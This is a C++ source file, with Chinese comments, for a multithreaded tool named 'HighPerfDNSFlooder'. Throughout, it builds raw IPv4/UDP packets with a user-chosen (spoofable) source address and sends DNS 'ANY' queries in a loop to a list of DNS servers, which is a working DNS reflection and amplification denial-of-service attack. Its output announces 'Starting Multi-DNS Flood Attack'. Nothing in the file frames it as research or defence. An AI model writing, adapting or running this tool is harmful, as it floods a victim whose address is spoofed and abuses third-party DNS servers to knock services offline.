#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <thread>
#include <atomic>
#include <cstring>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <chrono>
#include <signal.h>
#include <fcntl.h>
#include <iomanip>

// DNS头部结构
struct dns_header {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
};

// DNS查询问题部分
struct dns_question {
    uint16_t qtype;
    uint16_t qclass;
};

class HighPerfDNSFlooder {
private:
    int raw_sock;
    std::string source_ip;
    std::vector<std::string> dns_servers;
    std::vector<std::string> domains;
    std::atomic<uint64_t> packets_sent;
    std::atomic<uint64_t> packets_failed;
    std::atomic<bool> running;
    
    // 使用原始数组来避免atomic的复制问题
    std::atomic<uint64_t>* server_stats;
    size_t server_count;
    
    uint16_t checksum(uint16_t *buf, int len) {
        uint32_t sum = 0;
        while (len > 1) {
            sum += *buf++;
            len -= 2;
        }
        if (len == 1) sum += *(uint8_t*)buf;
        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        return ~sum;
    }
    
    void encode_domain_name(const std::string& domain, std::vector<uint8_t>& buffer) {
        size_t start = 0;
        size_t end = domain.find('.');
        while (end != std::string::npos) {
            std::string segment = domain.substr(start, end - start);
            buffer.push_back(segment.length());
            buffer.insert(buffer.end(), segment.begin(), segment.end());
            start = end + 1;
            end = domain.find('.', start);
        }
        std::string last_segment = domain.substr(start);
        buffer.push_back(last_segment.length());
        buffer.insert(buffer.end(), last_segment.begin(), last_segment.end());
        buffer.push_back(0);
    }
    
    // 轻量级的轮询选择
    size_t get_server_index(uint64_t sequence) {
        return sequence % server_count;
    }
    
    // 轻量级的域名选择
    size_t get_domain_index(uint64_t sequence) {
        return sequence % domains.size();
    }
    
    // 轻量级的端口生成
    uint16_t get_source_port(int thread_id, uint64_t sequence) {
        return 10000 + (thread_id * 1000) + (sequence % 1000);
    }
    
    // 轻量级的ID生成
    uint16_t generate_id(int thread_id, uint64_t sequence) {
        return (thread_id * 1000 + sequence) % 65535;
    }
    
    void build_dns_packet(const std::string& domain, const std::string& dns_server, 
                         std::vector<uint8_t>& packet, uint16_t src_port, uint16_t packet_id) {
        packet.clear();
        
        // 计算包大小
        std::vector<uint8_t> encoded_domain;
        encode_domain_name(domain, encoded_domain);
        uint16_t packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + 
                              sizeof(struct dns_header) + encoded_domain.size() + sizeof(struct dns_question);
        
        packet.resize(packet_size);
        
        // IP头部
        struct iphdr* ip_header = (struct iphdr*)packet.data();
        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = 0;
        ip_header->tot_len = htons(packet_size);
        ip_header->id = htons(packet_id);
        ip_header->frag_off = 0;
        ip_header->ttl = 64;
        ip_header->protocol = IPPROTO_UDP;
        inet_pton(AF_INET, source_ip.c_str(), &ip_header->saddr);
        inet_pton(AF_INET, dns_server.c_str(), &ip_header->daddr);
        ip_header->check = 0;
        
        // UDP头部
        struct udphdr* udp_header = (struct udphdr*)(ip_header + 1);
        udp_header->source = htons(src_port);
        udp_header->dest = htons(53);
        udp_header->len = htons(sizeof(struct udphdr) + sizeof(struct dns_header) + 
                               encoded_domain.size() + sizeof(struct dns_question));
        udp_header->check = 0;
        
        // DNS头部
        struct dns_header* dns_hdr = (struct dns_header*)(udp_header + 1);
        dns_hdr->id = htons(packet_id);
        dns_hdr->flags = htons(0x0100);
        dns_hdr->qdcount = htons(1);
        dns_hdr->ancount = 0;
        dns_hdr->nscount = 0;
        dns_hdr->arcount = 0;
        
        // 编码的域名
        uint8_t* domain_ptr = (uint8_t*)(dns_hdr + 1);
        memcpy(domain_ptr, encoded_domain.data(), encoded_domain.size());
        
        // DNS问题部分
        struct dns_question* question = (struct dns_question*)(domain_ptr + encoded_domain.size());
        question->qtype = htons(255);  // ANY类型
        question->qclass = htons(1);
        
        // 计算IP校验和
        ip_header->check = checksum((uint16_t*)packet.data(), sizeof(struct iphdr));
    }
    
    void send_thread(int thread_id, int total_threads) {
        std::vector<uint8_t> packet;
        struct sockaddr_in dest_addr;
        memset(&dest_addr, 0, sizeof(dest_addr));
        dest_addr.sin_family = AF_INET;
        
        uint64_t sequence = thread_id * 1000000; // 每个线程不同的起始序列
        
        while (running) {
            // 使用轮询方式选择DNS服务器和域名
            size_t server_idx = get_server_index(sequence);
            size_t domain_idx = get_domain_index(sequence);
            uint16_t src_port = get_source_port(thread_id, sequence);
            uint16_t packet_id = generate_id(thread_id, sequence);
            
            const std::string& dns_server = dns_servers[server_idx];
            const std::string& domain = domains[domain_idx];
            
            // 设置目标地址
            inet_pton(AF_INET, dns_server.c_str(), &dest_addr.sin_addr);
            
            build_dns_packet(domain, dns_server, packet, src_port, packet_id);
            
            ssize_t sent = sendto(raw_sock, packet.data(), packet.size(), 0,
                                (struct sockaddr*)&dest_addr, sizeof(dest_addr));
            
            if (sent > 0) {
                packets_sent++;
                server_stats[server_idx]++;
            } else {
                packets_failed++;
            }
            
            sequence++;
            
            // 每发送一定数量后稍微让步
            if (sequence % 1000 == 0) {
                std::this_thread::yield();
            }
        }
    }

public:
    HighPerfDNSFlooder(const std::string& src_ip) 
        : source_ip(src_ip), packets_sent(0), packets_failed(0), running(false), 
          server_stats(nullptr), server_count(0) {
        
        raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (raw_sock < 0) {
            perror("socket");
            throw std::runtime_error("Failed to create raw socket (need root privileges)");
        }
        
        int one = 1;
        if (setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
            perror("setsockopt");
            close(raw_sock);
            throw std::runtime_error("Failed to set IP_HDRINCL");
        }
    }
    
    ~HighPerfDNSFlooder() {
        stop();
        if (raw_sock >= 0) {
            close(raw_sock);
        }
        if (server_stats) {
            delete[] server_stats;
        }
    }
    
    // 从文件加载DNS服务器
    bool load_dns_servers(const std::string& filename) {
        std::ifstream file(filename);
        if (!file.is_open()) {
            std::cerr << "Failed to open DNS servers file: " << filename << std::endl;
            return false;
        }
        
        std::string line;
        while (std::getline(file, line)) {
            if (!line.empty()) {
                dns_servers.push_back(line);
            }
        }
        
        server_count = dns_servers.size();
        if (server_count > 0) {
            // 使用动态数组来避免atomic复制问题
            server_stats = new std::atomic<uint64_t>[server_count];
            for (size_t i = 0; i < server_count; ++i) {
                server_stats[i] = 0;
            }
        }
        
        std::cout << "Loaded " << server_count << " DNS servers from " << filename << std::endl;
        return server_count > 0;
    }
    
    // 从文件加载域名
    bool load_domains(const std::string& filename) {
        std::ifstream file(filename);
        if (!file.is_open()) {
            std::cerr << "Failed to open domains file: " << filename << std::endl;
            return false;
        }
        
        std::string line;
        while (std::getline(file, line)) {
            if (!line.empty()) {
                domains.push_back(line);
            }
        }
        
        std::cout << "Loaded " << domains.size() << " domains from " << filename << std::endl;
        return !domains.empty();
    }
    
    // 开始洪水攻击
    void start(int thread_count = -1) {
        if (dns_servers.empty()) {
            std::cerr << "No DNS servers loaded!" << std::endl;
            return;
        }
        if (domains.empty()) {
            std::cerr << "No domains loaded!" << std::endl;
            return;
        }
        
        if (thread_count <= 0) {
            thread_count = std::thread::hardware_concurrency();
            if (thread_count == 0) thread_count = 4;
        }
        
        running = true;
        packets_sent = 0;
        packets_failed = 0;
        
        // 重置服务器统计
        for (size_t i = 0; i < server_count; ++i) {
            server_stats[i] = 0;
        }
        
        std::vector<std::thread> threads;
        
        std::cout << "==========================================" << std::endl;
        std::cout << "Starting Multi-DNS Flood Attack" << std::endl;
        std::cout << "Source IP: " << source_ip << std::endl;
        std::cout << "DNS Servers: " << server_count << std::endl;
        std::cout << "Domains: " << domains.size() << std::endl;
        std::cout << "Threads: " << thread_count << std::endl;
        std::cout << "==========================================" << std::endl;
        
        // 启动发送线程
        for (int i = 0; i < thread_count; ++i) {
            threads.emplace_back(&HighPerfDNSFlooder::send_thread, this, i, thread_count);
        }
        
        // 统计线程
        std::thread stats_thread([this]() {
            auto last_time = std::chrono::steady_clock::now();
            uint64_t last_count = 0;
            
            while (running) {
                std::this_thread::sleep_for(std::chrono::seconds(2));
                
                auto now = std::chrono::steady_clock::now();
                auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - last_time).count();
                uint64_t current_count = packets_sent.load();
                uint64_t pps = (current_count - last_count) / (elapsed ? elapsed : 1);
                
                std::cout << "Total Packets: " << current_count 
                         << " | PPS: " << pps 
                         << " | Failed: " << packets_failed.load() << std::endl;
                
                // 显示每个DNS服务器的统计
                if (server_count > 0) {
                    std::cout << "Server Distribution: ";
                    for (size_t i = 0; i < server_count; ++i) {
                        if (i > 0) std::cout << ", ";
                        std::cout << dns_servers[i] << "=" << server_stats[i].load();
                    }
                    std::cout << std::endl;
                }
                std::cout << "---" << std::endl;
                
                last_time = now;
                last_count = current_count;
            }
        });
        
        std::cout << "Attack started. Press Enter to stop..." << std::endl;
        std::cin.get();
        
        stop();
        
        for (auto& thread : threads) {
            if (thread.joinable()) {
                thread.join();
            }
        }
        
        if (stats_thread.joinable()) {
            stats_thread.join();
        }
        
        std::cout << "Attack stopped." << std::endl;
        std::cout << "Total packets sent: " << packets_sent << std::endl;
        std::cout << "Total packets failed: " << packets_failed << std::endl;
        
        // 显示最终统计
        if (server_count > 0) {
            std::cout << "Final Server Distribution:" << std::endl;
            for (size_t i = 0; i < server_count; ++i) {
                std::cout << "  " << dns_servers[i] << ": " << server_stats[i].load() << " packets" << std::endl;
            }
        }
    }
    
    void stop() {
        running = false;
    }
};

// 全局变量用于信号处理
HighPerfDNSFlooder* g_flooder = nullptr;

void signal_handler(int signal) {
    std::cout << "\nReceived signal " << signal << ", stopping..." << std::endl;
    if (g_flooder) {
        g_flooder->stop();
    }
}

void print_usage(const char* program_name) {
    std::cout << "Usage: " << program_name << " <source_ip> <domains_file> <dns_servers_file> [thread_count]" << std::endl;
    std::cout << "Arguments:" << std::endl;
    std::cout << "  source_ip          Source IP address to use in packets" << std::endl;
    std::cout << "  domains_file       File containing list of domains (one per line)" << std::endl;
    std::cout << "  dns_servers_file   File containing list of DNS servers (one per line)" << std::endl;
    std::cout << "  thread_count       Number of threads to use (optional, default: CPU cores)" << std::endl;
    std::cout << std::endl;
    std::cout << "Examples:" << std::endl;
    std::cout << "  " << program_name << " 192.168.1.100 domains.txt dns_servers.txt" << std::endl;
    std::cout << "  " << program_name << " 192.168.1.100 domains.txt dns_servers.txt 8" << std::endl;
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc > 5) {
        print_usage(argv[0]);
        return 1;
    }
    
    std::string source_ip = argv[1];
    std::string domains_file = argv[2];
    std::string dns_servers_file = argv[3];
    int thread_count = -1;
    
    if (argc == 5) {
        thread_count = std::stoi(argv[4]);
        if (thread_count <= 0) {
            std::cerr << "Error: Thread count must be positive" << std::endl;
            return 1;
        }
    }
    
    // 注册信号处理
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    try {
        HighPerfDNSFlooder flooder(source_ip);
        g_flooder = &flooder;
        
        if (!flooder.load_domains(domains_file)) {
            std::cerr << "Failed to load domains from " << domains_file << std::endl;
            return 1;
        }
        
        if (!flooder.load_dns_servers(dns_servers_file)) {
            std::cerr << "Failed to load DNS servers from " << dns_servers_file << std::endl;
            return 1;
        }
        
        flooder.start(thread_count);
        
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }
    
    g_flooder = nullptr;
    return 0;
}
